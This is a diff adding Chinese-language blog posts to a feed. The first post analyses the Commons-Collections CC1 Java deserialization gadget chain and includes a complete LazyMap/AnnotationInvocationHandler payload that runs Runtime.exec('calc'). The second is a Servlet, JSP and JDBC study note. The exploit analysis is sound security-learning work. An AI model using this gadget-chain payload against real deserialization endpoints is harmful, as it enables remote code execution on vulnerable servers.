+                throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + this.iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' does not exist&quot;);
+            } catch (IllegalAccessException var6) {
+                throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + this.iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' cannot be accessed&quot;);
+            } catch (InvocationTargetException var7) {
+                throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + this.iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' threw an exception&quot;, var7);
+            }
+        }
+    }
+</code></pre>
+<p>其中这两行一眼反射</p>
+<pre><code class="language-java">Class cls = input.getClass();
+Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
+// 常见利用链写法
+//Runtime runtime =  Runtime.getRuntime(); 
+// Class&lt;? extends Runtime&gt; aClass = runtime.getClass();
+// Method exec = aClass.getMethod(&quot;exec&quot;, String.class);
+// exec.invoke(runtime,&quot;calc&quot;);
+// 所以这里 input为 ( input为Runtime.getRuntime())
+</code></pre>
+<p>其中 <code>iMethodName</code> 和 <code>iParamTypes</code> 都在构造方法中有定义</p>
+<pre><code class="language-java">private InvokerTransformer(String methodName) {
+        this.iMethodName = methodName;
+        this.iParamTypes = null;
+        this.iArgs = null;
+    }
+</code></pre>
+<p>所以, payload构造时:</p>
+<pre><code class="language-java">Transformer transformerChain = new ChainedTransformer(new Transformer[]{
+new ConstantTransformer(Runtime.class),
+new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class} ,new Object[]{&quot;getRuntime&quot;,new Class[0]}),
+new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
+new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[] {&quot;calc.exe&quot;})
+});
+</code></pre>
+<p>利用链入口点: <code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code></p>
+<h2 id="利用链">利用链</h2>
+<p>目前已有的利用链有两条,</p>
+<p>一条是ysoserial用的LazyMap</p>
+<p>另一条是TransformedMap</p>
+<blockquote>
+<p>LazyMap 和 TransformedMap 类似，都来自于 Common-Collections 库，并继承 AbstractMapDecorator</p>
+<p>LazyMap 的漏洞触发点和 TransformedMap 唯一的差别是，TransformedMap 是在写入元素的时候执行 transform，而 LazyMap 是在其 get 方法中执行的 factory.transform 。其实这也好理解，LazyMap 的作用是“懒加载”，在 get 找不到值的时候，它会调用 factory.transform 方法去获取一个值</p>
+</blockquote>
+<h2 id="lazymap利用链分析">Lazymap利用链分析</h2>
+<p>根据刚刚利用链核心, 从 <code>Find Usages</code> 找到了 <code>Lazymap</code> 调用了 <code>transform</code> . 然后目标是最后找到 <code>readObject</code> 方法.</p>
+<h3 id="一-lazymap">一. <strong>LazyMap</strong></h3>
+<ol>
+<li>
+<p>首先看 <code>LazyMap</code> 下的 <code>get</code> 方法, 调用了 <strong>transform 方法(即利用链核心下的类方法)</strong></p>
+<blockquote>
+<p>get方法同时还要求传入一个Object 参数，get方法内部在调用transform方法之前会先判断一下key，如果当前map中不存在key的话，则通过factory来创建一个value</p>
+</blockquote>
+<pre><code class="language-java">public Object get(Object key) {
+        // create value for key if key is not currently in the map
+        if (map.containsKey(key) == false) {
+            Object value = factory.transform(key);
+            map.put(key, value);
+            return value;
+        }
+        return map.get(key);
+    }
+
+// factory 这里是LazyMap类的成员属性, 其他数据类型也是Transformer
+</code></pre>
+<p>当在get找不到值的时候，它会调用factory.transform方法去获取一个值。</p>
+<p>这里 <code>factory</code> 找可控的地方, 找到一个public访问权限的 <code>decorate</code> 方法</p>
+<pre><code class="language-java">public static Map decorate(Map map, Transformer factory) {
+        return new LazyMap(map, factory);
+ }
+</code></pre>
+<p><strong>factory可控</strong>: 反射或者构造方法控制factory. 从而使其调用指定类的transformer方法.</p>
+</li>
+</ol>
+<h3 id="二-lazymap-的get触发点">二.  <strong><code>LazyMap</code> 的get触发点</strong></h3>
+<p>查找<code>AnnotationInvocationHandler</code> 类 <code>get</code> 方法被调用的地方, 最后找到了 <code>invoke</code> 方法</p>
+<pre><code class="language-java">public Object invoke(Object proxy, Method method, Object[] args) {
+    String member = method.getName();
+    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();
+
+    // Handle Object and Annotation methods
+    if (member.equals(&quot;equals&quot;) &amp;&amp; paramTypes.length == 1 &amp;&amp;
+        paramTypes[0] == Object.class)
+        return equalsImpl(args[0]);
+    if (paramTypes.length != 0)
+        throw new AssertionError(&quot;Too many parameters for an annotation method&quot;);
+
+    switch(member) {
+        case &quot;toString&quot;:
+            return toStringImpl();
+        case &quot;hashCode&quot;:
+            return hashCodeImpl();
+        case &quot;annotationType&quot;:
+            return type;
+    }
+
+    // Handle annotation member accessors
+    Object result = memberValues.get(member);
+    // ....
+}
+</code></pre>
+<p>注意这里 <code>memberValues</code> 可控</p>
+<h3 id="三-invoke-调用点">三. ** <code>invoke</code> 调用点**</h3>
+<p>找到能调用( <code>AnnotationInvocationHandler</code> 类的 <code>invoke</code> 方法)的点.</p>
+<p>因为 <code>AnnotationInvocationHandler</code> 类继承了 <code>InvocationHandler</code> 类, 这里可以用<a href="https://www.cnblogs.com/wobuchifanqie/p/9991342.html">动态代理类</a>的方式, 用 <code>newProxyInstance</code></p>
+<pre><code class="language-java">public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h);
+// 分别传入:
+// 1. Map类加载器
+// 2. lazyMap实现的接口 LazyMap.getClass().getInterfaces()
+// 3. annotationInvocationHandler对象 (即InvocationHandler) 
+</code></pre>
+<p>接下来的目标是  <code>readObject</code>中调用任意方法，调用者是<code>AnnotationInvocationHandler</code>代理对象</p>
+<h3 id="四-利用动态代理来构造invoke调用点-修改-membervalues-为指定代理类"><strong>四.  利用动态代理</strong>来<strong>构造invoke调用点 (修改 <code>memberValues</code> 为指定代理类)</strong></h3>
+<p>在 <code>AnnotationinvocationHandler</code> 类下, 因为 <code>this.memberValues</code> 可控(在实例化时传入), 而且在该类的 <code>readObject</code> 函数中, 也调用了<code>memberValues</code> . 所以可以利用反射, 将生成的代理类赋值给 <code>memberValues</code></p>
+<ol>
+<li>利用反射 将 <code>proxyMap</code> (即LazyMap代理类) 作为参数传入赋值给 <code>this.memberValues</code> , 从而调用<code>invoke</code> 调用点.</li>
+</ol>
+<pre><code class="language-java">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) {
+        Class[] var3 = var1.getInterfaces();
+        if (var1.isAnnotation() &amp;&amp; var3.length == 1 &amp;&amp; var3[0] == Annotation.class) {
+            this.type = var1;
+            this.memberValues = var2;
+        } else {
+            throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);
+        }
+    }
+</code></pre>
+<p>这里 <code>memberValues</code> 对应上面的</p>
+<h3 id="五-readobject-方法-利用链反序列化入口点重要"><strong>五.  <code>readObject</code> 方法, 利用链反序列化入口点(重要)</strong></h3>
+<p>因为入口点在 <code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code></p>
+<p>该入口点会在反序列化的时候重写 <code>readObject</code> 方法</p>
+<pre><code class="language-java">private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
+        Map var3 = var2.memberTypes();
+        //获取LazyMap父类的entrySet
+        Iterator var4 = this.memberValues.entrySet().iterator(); //遍历key-value
+        while(var4.hasNext()) {
+            //代理对象调用方法
+            Entry var5 = (Entry)var4.next();
+            String var6 = (String)var5.getKey();
+            Class var7 = (Class)var3.get(var6);
+            if (var7 != null) {
+                Object var8 = var5.getValue();
+                if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) {
+                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6)));
+                }
+            }
+        }
+    }
+</code></pre>
+<p>这里 <code>this.memberValues</code> 的值就是动态代理对象 <code>proxyMap</code></p>
+<p>所以当反序列化执行, 动态代理就会调用代理对象(即: 在 readObject() 方法中,调用了 memberValues 的方法,这个 memberValues 就是动态代理对象. 好像是重复的话 但理解是这样的)</p>
+<h2 id="payload">payload</h2>
+<p>这个网上都有, 参考其中一个:</p>
+<pre><code class="language-java">Transformer[] transformers = new Transformer[]{
+new ConstantTransformer(Runtime.class),
+new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}),
+new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),
+new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object []{&quot;calc&quot;})
+};
+ChainedTransformer chainedtransformer = new ChainedTransformer(transformers);
+Map innerMap = new HashMap();
+Map outerMap = LazyMap.decorate(innerMap,chainedtransformer);
+Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+Constructor constructor = clazz.getDeclaredConstructor(Class.class,Map.class);
+constructor.setAccessible(true);
+InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class,outerMap);
+Map proxyMap = (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},handler);
+Object o = (Object) constructor.newInstance(Override.class,proxyMap);
+serialize(o);
+unserialize();
+</code></pre>
+<h2 id="修复">修复</h2>
+<blockquote>
+<p><code>LazyMap</code>的漏洞触发在get和invoke中 而<code>TransformedMap</code>的漏洞触发在setValue中 同样在 <strong>jdk 8u71</strong>之后，由于<code>AnnotationInvocationHandler</code>不再直接使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，后续对Map的操作都是基于这个新的LinkedHashMap对象。 因此CC1链只局限在<strong>jdk 8u71</strong>之前的版本。</p>
+</blockquote>
+<h2 id="reference">Reference</h2>
+<ul>
+<li><a href="https://blog.csdn.net/m0_64685672/article/details/122526803?spm=1001.2014.3001.5502">https://blog.csdn.net/m0_64685672/article/details/122526803?spm=1001.2014.3001.5502</a></li>
+<li><a href="https://blog.csdn.net/qq_35733751/article/details/118462281">https://blog.csdn.net/qq_35733751/article/details/118462281</a></li>
+<li><a href="https://blog.csdn.net/weixin_45808483/article/details/122743960">https://blog.csdn.net/weixin_45808483/article/details/122743960</a></li>
+<li><a href="https://blog.csdn.net/u012326462/article/details/81293186">https://blog.csdn.net/u012326462/article/details/81293186</a> (动态代理类)</li>
+<li><a href="https://zoceanyq.github.io/2022/11/08/cc1%E9%93%BE%E5%88%86%E6%9E%90/">https://zoceanyq.github.io/2022/11/08/cc1链分析/</a></li>
+<li><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?vd_source=df9a56be52d51a090e98fcf8c8310ec2">https://www.bilibili.com/video/BV1no4y1U7E1/?vd_source=df9a56be52d51a090e98fcf8c8310ec2</a> (视频先mark在这里, 不过我先看的文章 视频打算最后有不懂的地方过)</li>
+<li><a href="https://mp.weixin.qq.com/s?__biz=MzU2NzkxMDUyNg==&amp;mid=2247486261&amp;idx=1&amp;sn=5bce20d898eba670b4b129a8a3092449">https://mp.weixin.qq.com/s?__biz=MzU2NzkxMDUyNg==&amp;mid=2247486261&amp;idx=1&amp;sn=5bce20d898eba670b4b129a8a3092449</a> (不建议作为一个了解cc1的整体文章阅读 但新人一些细节上没看懂的可以看这篇)</li>
+<li><a href="https://github.com/p4d0rn/Java_Zoo/blob/main/Deserial/CC1_LazyMap.md">https://github.com/p4d0rn/Java_Zoo/blob/main/Deserial/CC1_LazyMap.md</a></li>
+</ul>
+<p>补充知识学习:</p>
+<ul>
+<li>动态代理(略)</li>
+<li>entrySet: <a href="https://blog.csdn.net/q5706503/article/details/85122343">https://blog.csdn.net/q5706503/article/details/85122343</a> (一个键值对就算一个entry )</li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Java学习笔记: Servlet]]></title>
+        <id>https://1dayluo.github.io/post/java-xue-xi-bi-ji-servlet/</id>
+        <link href="https://1dayluo.github.io/post/java-xue-xi-bi-ji-servlet/">
+        </link>
+        <updated>2023-06-08T12:05:34.000Z</updated>
+        <content type="html"><![CDATA[<p>重新捡起java诶~</p>
+<h2 id="基础概念">基础概念</h2>
+<h3 id="j2ee-java-ee-jakarta-ee">J2EE &amp; JAVA EE &amp; jakarta EE</h3>
+<p>在此之前要知道 ：</p>
+<blockquote>
+<p>Ever heard of Java EE? How about Java 2EE, J2EE, or now Jakarta EE? Actually, <strong>these are all different names for the same thing: a set of enterprise specifications that extend Java SE.</strong></p>
+</blockquote>
+<p>就是说上面的都是指的同一个存在，用于提供一系列的规范，（规范包括JDBC、JNDI、EJB、RMI、Servlet、JSP、XML、JMS、Java IDL、JTS、JTA、JavaMail和JAF  ）。而这个演变历史是2EE -&gt; Java EE  -&gt; Jakarta EE ，这里面后两者是因为Oracle把JavaEE移交给开源组织Eclipse，并且没有运行Eclipse继续沿用Java这一词。我在学习这里的时候，默认用的是最新的规范，即jakarta EE。</p>
+<h3 id="servlet作用">Servlet作用</h3>
+<ul>
+<li>读取客户端/浏览器数据发送的显式数据,包括HTML表单,或来自applet或自定义HTTP客户端程序的表单</li>
+<li>读取客户端/浏览器数据发送的隐式数据,例如cookies, 媒体类型和浏览器能理解的压缩格式</li>
+<li>处理数据并生成结果。这个过程可能需要访问数据库，执行 RMI 或 CORBA 调用，调用 Web 服务，或者直接计算得出对应的响应。</li>
+<li>发生显示数据到客户端</li>
+<li>发送隐式数据到客户端</li>
+</ul>
+<h3 id="servlet基本实现">Servlet基本实现</h3>
+<p>JDK中实现了常见的Servlet功能. 即 <code>GenericServlet</code> , 对于HTTP请求, 又进一步请求了 <code>HttpServlet</code> 抽象类.</p>
+<p>创建Servlet需要:</p>
+<ol>
+<li>
+<p>java代码, 继承Servlet下的各种抽象类,例如 <code>HttpServlet</code></p>
+<ul>
+<li>
+<p><code>HttpServlet</code> 例子:</p>
+<pre><code class="language-java">import java.io.*;
+import javax.servlet.http.*;
+import javax.servlet.annotation.*;
+
+@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello&quot;)
+public class HelloServlet extends HttpServlet {
+    private String message;
+
+    public void init() {
+        message = &quot;Hello World!&quot;;
+    }
+
+    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
+        response.setContentType(&quot;text/html&quot;);
+
+        // Hello
+        PrintWriter out = response.getWriter();
+        out.println(&quot;&lt;html&gt;&lt;body&gt;&quot;);
+        out.println(&quot;&lt;h1&gt;&quot; + message + &quot;&lt;/h1&gt;&quot;);
+        out.println(&quot;&lt;/body&gt;&lt;/html&gt;&quot;);
+    }
+
+    public void destroy() {
+    }
+}
+</code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p>修改 <code>web.xml</code> 配置文件 / 或者用 <code>WebServlet</code> 注解方式配置servlet</p>
+<ul>
+<li>
+<p>注解方式(Servlet 3.0之后):</p>
+<pre><code class="language-java">@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello&quot;)
+public class HelloServlet extends HttpServlet {
+...
+}
+</code></pre>
+</li>
+<li>
+<p>web.xml文件</p>
+<p>在 /WEB-INF 的目录下, 这个目录下文件是不显示在部署后的网站里的(是否对用户隐藏)</p>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="不同build-system之间的区别">不同Build System之间的区别</h3>
+<p>当创建一个New Project的时候可以看到，除了IDEA内置的intelliJ外还有Maven和Gradle</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_6/20230608_0.png" alt="Untitled" loading="lazy"></figure>
+<p>区别是intelliJ不支持创建工件、部署到存储库、从wsdl生成代码…而maven和Gradle支持build自动化构建</p>
+<p>maven <code>pom.xml</code>定义生命周期目标</p>
+<p>gradle <code>build.gradle</code>定义任务。</p>
+<h2 id="hello-servlet">Hello Servlet</h2>
+<h3 id="http路径映射到servlet">HTTP路径映射到Servlet</h3>
+<blockquote>
+<p>正常情况下定义好 HelloServlet 类之后，容器并不知道这个类的存在，也不知道应该将什么 HTTP 路径映射到这个 Servlet，传统上需要用户自己修改 <code>web.xml</code> 配置文件(这也是 Servlet 标准的一部分)，添加 <code>&lt;servlet&gt;</code> 和 <code>&lt;servlet-mapping&gt;</code> 标签来指定这些信息。在 Servlet 3.0 之后，就可以使用注解的方式配置 Servlet 了，如上面的 <code>WebServlet</code> 注解。</p>
+</blockquote>
+<p>下面的实战都是用的Servlet3.0 以后的版本</p>
+<h3 id="filter">Filter</h3>
+<p>Servlet另一个很重要的概念是 <code>Filter</code> ，继承类  <code>jakarta.servlet.Filter</code>（或javax  ） 作用如下</p>
+<ol>
+<li>过滤脏敏感字符（绿一些敏感的字符串）；</li>
+<li>避免中文乱码（统一设置请求和响应的编码）；</li>
+<li>权限验证（规定只有带指定Session或Cookie的请求，才能访问资源）；</li>
+<li>用于实现自动登录；</li>
+</ol>
+<p>过滤顺序如下</p>
+<blockquote>
+<p>过滤器链的完整流程顺序是这样的：<strong>客户端发送http请求到Web服务器上，Web服务器对该请求URL找到对应负责的过滤器形成过滤器链，接着从第一个过滤器开始进行过滤操作，也就是调用Filter.doFilter方法，这个方法的逻辑是开发者编写的，当当前请求满足当前过滤器的要求或者是过滤操作完毕之后，应在调用chain.doFilter方法进行放行，该方法又会调用链中的下一个过滤器的doFilter方法继续过滤，如果当前过滤器是过滤器链的最后一个过滤器，那么chain.doFilter方法将会执行资源访问操作，访问完毕之后，将会依照最开始过滤器的调用顺序倒序的返回，接着执行chain.doFilter方法后面的代码。最终将响应结果交给Web服务器，Web服务器再将响应返回给客户端。</strong></p>
+</blockquote>
+<p>关于更多的Filter代码示例，包括多个Filter的执行顺序可以看掘金的文章：<a href="https://juejin.cn/post/7000950677409103880#heading-5">https://juejin.cn/post/7000950677409103880#heading-5</a></p>
+<h3 id="实战1-创建一个servlet项目">实战1:  创建一个servlet项目</h3>
+<ul>
+<li>
+<p>IDEA创建一个servlet项目的步骤 - New Project</p>
+<ol>
+<li>New project</li>
+</ol>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_6/20230608_1.png" alt="Untitled" loading="lazy"></figure>
+<ol>
+<li>项目名称旁右键，选择Add Framework support</li>
+</ol>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_6/20230608_2.png" alt="Untitled" loading="lazy"></figure>
+<ol>
+<li>选择web application</li>
+</ol>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_6/20230608_3.png" alt="Untitled" loading="lazy"></figure>
+</li>
+<li>
+<p>IDEA配置tomcat</p>
+<ol>
+<li>选择Edit Configuration</li>
+</ol>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_6/20230608_4.png" alt="Untitled" loading="lazy"></figure>
+<ol>
+<li>选择tomcat</li>
+</ol>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_6/20230608_5.png" alt="Untitled" loading="lazy"></figure>
+</li>
+<li>
+<p>tomcat部署网站</p>
+<p>需要设置这个deployment</p>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_6/20230608_6.png" alt="Untitled" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_6/20230608_7.png" alt="Untitled" loading="lazy"></figure>
+</li>
+<li>
+<p>tomcat修改application主目录名</p>
+<p>改这里Application context。</p>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_6/20230608_8.png" alt="Untitled" loading="lazy"></figure>
+</li>
+</ul>
+<p>其他</p>
+<ul>
+<li>
+<p>IDEA tomcat日志出现乱码</p>
+<p>参考 <a href="https://juejin.cn/post/7212864793651396669">https://juejin.cn/post/7212864793651396669</a></p>
+<p>以上方法我都试过了仍没有得到最完美的解决，最后还有一种办法是在IDEA编辑器内，点击Help-&gt;Edit Custom VM Options... ，在最下方添加-Dfile.encoding=UTF-8，然后重启IDEA，运行Tomcat查看输出</p>
+</li>
+</ul>
+<h3 id="实战2-创建路由">实战2： 创建路由</h3>
+<ul>
+<li>
+<p>./src 下创建一个new package，然后New一个Servlet</p>
+<p>如果没有的话，则需要<a href="https://www.jetbrains.com/help/idea/creating-and-configuring-web-application-elements.html#createElement">创建servlet模板</a>（tomcat 10里api接口名变动，需要把 <code>javax</code>改为 <code>jakarta</code></p>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_6/20230608_9.png" alt="Untitled" loading="lazy"></figure>
+</li>
+<li>
+<p>导入servlet的jar文件</p>
+<p>直接创建会报错，如图</p>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_6/20230608_10.png" alt="Untitled" loading="lazy"></figure>
+<ol>
+<li>类名需要导入jar文件（如下图）,右键package -&gt; Open module setting，这样导入后在类名上按 <code>Ctrl-q</code>就会有对应提示(有document的话) ，，然后在modules的依赖里勾选， 这里（选provide，因为不需要部署在服务器上</li>
+</ol>
+<blockquote>
+<p>As somebody mentioned it above - these libraries are part of an application server so they should not be deployed to the server as other libraries like Spring and so on.</p>
+</blockquote>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_6/20230608_11.png" alt="Untitled" loading="lazy"></figure>
+</li>
+<li>
+<p><code>.java</code> 代码编写：urlpatterns概念</p>
+<ol>
+<li>模板如下， 新增urlPatterns的参数传入， 然后需要配置tomcat （如果之前将Application context配置了的话，取消为空）</li>
+</ol>
+<pre><code class="language-java">package servlets;
+
+import jakarta.servlet.*;
+import jakarta.servlet.http.*;
+import jakarta.servlet.annotation.*;
+import java.io.IOException;
+//doc:https://jakarta.ee/specifications/servlet/4.0/apidocs/
+@WebServlet(name = &quot;HelloWorld&quot;, urlPatterns = &quot;/hello&quot;)
+public class HelloWorld extends HttpServlet {
+    @Override
+    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+        System.out.println(&quot;the GET request &quot;);
+    }
+
+    @Override
+    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+        System.out.println(&quot;the POST request&quot;);
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_6/20230608_12.png" alt="Untitled" loading="lazy"></figure>
+<ol>
+<li>访问 <code>/hello</code>  地址</li>
+</ol>
+<p>可以看到后台输出</p>
+<figure data-type="image" tabindex="14"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_6/20230608_13.png" alt="Untitled" loading="lazy"></figure>
+</li>
+<li>
+<p>编写响应内容 ( <code>text/plain</code>）</p>
+<p>代码如下 (这里必须通过getWriter返回的 <code>PrintWriter</code> 对象来向response里写入内容</p>
+<pre><code class="language-java">protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+        System.out.println(&quot;the GET request &quot;);
+        response.setContentType(&quot;text/plain&quot;);
+        response.getWriter().println(&quot;Here is a line&quot;);
+        response.getWriter().println(&quot;Here is another line&quot;);
+    }
+</code></pre>
+</li>
+</ul>
+<p>注意 ： Servlet并不是线程安全的</p>
+<figure data-type="image" tabindex="15"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_6/20230608_14.png" alt="Untitled" loading="lazy"></figure>
+<p>其他</p>
+<p>jakarta对应的document  <a href="https://jakarta.ee/specifications/servlet/4.0/apidocs/">https://jakarta.ee/specifications/servlet/4.0/apidocs/</a></p>
+<h3 id="实战3-选jakarata-ee的方式部署servlet">实战3 : 选jakarata  EE的方式部署servlet</h3>
+<ul>
+<li>
+<p>New Project，新建一个项目，并选择jakarta EE</p>
+<p>注意Template选Web application 更多部署请看官方<a href="https://www.jetbrains.com/help/idea/creating-and-running-your-first-restful-web-service.html#source_code">文档</a></p>
+<figure data-type="image" tabindex="16"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_6/20230608_15.png" alt="Untitled" loading="lazy"></figure>
+</li>
+<li>
+<p>修改当前的java版本</p>
+<p><code>Ctrl-Alt-Shift-S</code>  下在project里查看当前java版本，，然后把 pom.xml改为对应的</p>
+<figure data-type="image" tabindex="17"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_6/20230608_16.png" alt="Untitled" loading="lazy"></figure>
+</li>
+<li>
+<p>添加jakarta支持到Modules内</p>
+<p><code>Ctrl  + Alt + Shift + S</code> 选择Modules</p>
+<p>然后选择Dependencies的tab，将tomcat 相关作为provided加入</p>
+</li>
+<li>
+<p>配置</p>
+<p>在下方出现的Fix里点击对应的打包文件 （如果没有打包，对 <code>pom.xml</code>右键选择 Module xxx 就可以了 ，人工的方式，一般应该不用）</p>
+<figure data-type="image" tabindex="18"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_6/20230608_17.png" alt="Untitled" loading="lazy"></figure>
+</li>
+</ul>
+<h3 id="一些servlet的项目结构">一些servlet的项目结构</h3>
+<p>会遇到这样的项目结构:</p>
+<ul>
+<li>dao:
+<ul>
+<li><code>DAO(Data Access Object)</code>  就是把访问数据库的代码封装起来, 作为一个模型类. DAO在数据库与业务逻辑(service) 之间</li>
+</ul>
+</li>
+<li>entity
+<ul>
+<li>实体层, 继承实体类.放实体及其对应的 <code>set()</code> , <code>get()</code> 方法. 对数据库进行操作,要先写entity层</li>
+</ul>
+</li>
+<li>service
+<ul>
+<li>业务逻辑层. 处理逻辑上的业务,不去考虑具体的实现. 这里使用接口, 因为接口是多继承, 类是单继承.</li>
+</ul>
+</li>
+<li>servlet
+<ul>
+<li>编写服务端程序,</li>
+</ul>
+</li>
+<li>util
+<ul>
+<li>多功能,基于工具的包.例如 字符串处理, 日期处理等. 是与业务无关的可以独立出来的内容</li>
+</ul>
+</li>
+</ul>
+<h2 id="jsp">JSP</h2>
+<p>刚刚的实战例子里看到，会自动创建目录结构和一些必备文件，其中就包括 <code>index.jsp</code></p>
+<p>有开发经验的大概了解过模板引擎（不管是nodejs的express还是python的flask，etc…. 开发都会用到 ），看下官方文档怎么说的吧：</p>
+<blockquote>
+<p><strong>JavaServer Pages (JSP) allows <em>dynamic</em> content injection into <em>static</em> contents using Java and Java Servlets</strong>.</p>
+</blockquote>
+<p>jsp 通过java以及java Servlet，从而允许将动态内容注入到静态内容中。官方文档见<a href="https://www.baeldung.com/jsp">这里</a> . JSP会被Servlet编译为对应的Servlet可执行的java代码.</p>
+<p>最基础的和express下模板引擎ejs的语法差不多，除此之外需要注意的jsp语法有:</p>
+<ul>
+<li><code>&lt;%@ directive attribute=&quot;value&quot; %&gt;</code></li>
+<li><code>&lt;jsp:action_name attribute=&quot;value&quot; /&gt;</code></li>
+</ul>
+<h2 id="jdbc-jmx">JDBC  | JMX</h2>
+<h3 id="jdbc-java-database-connectivity">JDBC (Java Database Connectivity)</h3>
+<blockquote>
+<p>JDBC (Java Database Connectivity) 就是 Java 访问数据库的一个标准。历史上在 JDK 1.1 中 JDBC 就已经是其中的一部分，也就是说 JDBC 本身也是 Java SE 的标准，但也包含在 Java EE 中。其包名可通过 <code>java.sql</code> 或者 <code>javax.sql</code> 进行访问。</p>
+</blockquote>
+<p>jdbc 使用API示例 :</p>
+<pre><code class="language-java">import java.sql.*;
+
+ public class TestJdbc {
+   public static void main(String[] args) throws Exception {
+     // Class.forName(&quot;com.mysql.jdbc.Driver&quot;);
+
+     // 1. Establishing the connection with the database
+     Connection conn = DriverManager.getConnection(
+       &quot;jdbc:mysql://localhost:3306/mydb?useSSL=false&quot;, &quot;root&quot;, &quot;rxhtemp&quot;);
+
+     // 2. Creating a statement object to execute a query
+     Statement stmt = conn.createStatement();
+
+     // 3. Executing the query and getting the ResultSet
+     ResultSet rs = stmt.executeQuery(&quot;SELECT * FROM user&quot;);
+
+     // 4. Processing the ResultSet
+     while (rs.next()) 
+       int id = rs.getInt(&quot;id&quot;);
+       String name = rs.getString(&quot;name&quot;);
+       System.out.println(&quot;ID: &quot; + id + &quot;, Name: &quot; + name);
+     }
+
+     // 5. Closing the database resources
+     rs.close();
+     stmt.close();
+     conn.close();
+   }
+ }
+</code></pre>
+<h3 id="jmx">JMX</h3>
+<p>全称为 Java Management Extensions，即 Java 管理拓展，主要用于管理和监控 Java 程序。常见的监控资源有 CPU 占用率、线程数、JVM 内存等</p>
+<p>我们常用的 JConsole、VisualVM，以及现在流行的 Spring Boot 框架中的 Spring Boot Actuator 内部都使用了 JMX 拓展</p>
+<p>JMX的关键组件:</p>
+<ul>
+<li>MBean: Managed Bean, 用于消息的传递.在 <code>java.lang.management</code> 中定义了许多 JDK 提供的 MBean</li>
+<li>MBeanServer: 用于 MBean 的管理，同名接口定义在 <code>javax.management</code> 中</li>
+<li>Connector : 面向客户端的组件, 负责具体协议的连接和转换.RMI Connector就是JMX标准实现的协议</li>
+<li>Adaptor : 称为适配器，和连接器类似，主要将客户端对服务器中 MBean 的操作适配为其他协议，比如 SNMP 或者 HTTP 等。</li>
+</ul>
+<h2 id="reference">Reference</h2>
+<ul>
+<li><a href="https://evilpan.com/2023/04/01/java-ee/">https://evilpan.com/2023/04/01/java-ee/</a></li>
